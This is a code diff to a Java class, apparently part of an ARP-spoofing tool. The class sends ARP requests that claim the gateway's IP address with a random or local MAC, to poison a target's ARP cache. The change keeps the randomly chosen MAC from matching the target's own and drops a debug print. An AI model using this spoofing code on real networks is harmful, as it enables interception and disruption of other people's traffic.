@@ -103,7 +103,7 @@ public class SendSpoofPackets implements Runnable {
                 .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                 .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
                 .operation(ArpOperation.REQUEST)
-                .srcHardwareAddr(getMacAddress())
+                .srcHardwareAddr(getMacAddress(mac))
                 .srcProtocolAddr(gatewayAddress)
                 .dstHardwareAddr(mac)
                 .dstProtocolAddr(ip);
@@ -116,14 +116,20 @@ public class SendSpoofPackets implements Runnable {
                 .paddingAtBuild(true);
 
         Packet packet = etherBuilder.build();
-        System.out.println("packet sent");
         sendHandle.sendPacket(packet);
     }
 
 
-    private MacAddress getMacAddress() {
+    private MacAddress getMacAddress(MacAddress destinationMacAddress) {
         if (randomMac) {
-            return randomMacs[((int) (Math.random() * 10)) % randomMacs.length];
+            int randomNumber = (int) (Math.random() * 10);
+            MacAddress randMac = randomMacs[randomNumber % randomMacs.length];
+            if (randMac.equals(destinationMacAddress)) {
+                randomNumber++;
+                return randomMacs[randomNumber % randomMacs.length];
+            }
+            return randMac;
+
         } else {
             return myMacAddress;
         }
